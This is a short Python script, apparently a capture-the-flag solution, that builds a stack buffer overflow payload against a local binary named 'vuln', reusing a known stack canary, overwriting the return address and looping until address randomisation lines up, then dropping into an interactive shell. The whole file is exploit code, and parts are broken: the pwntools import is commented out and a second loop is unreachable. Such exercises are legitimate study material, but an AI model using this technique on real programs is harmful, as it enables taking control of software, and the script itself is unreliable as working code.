
import sys
import signal
import os
from struct import pack
# from pwn import *
canary = '57Gh'
p = 'A' * (32)  # overflow buffer
p += canary  # overflow old ebp
p += 'a'*16
p += pack('<I', 0x565d97ed)  # new eip

# PIE is enabled so we just will have to run until it works
while True:
    sh = process('./vuln')
    sh.sendlineafter('> ', str(200))
    sh.sendlineafter('> ', p)
    sh.interactive()


def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)


while True:

    os.system('echo ~/tmp | ./vuln')
    signal.signal(signal.SIGINT, signal_handler)
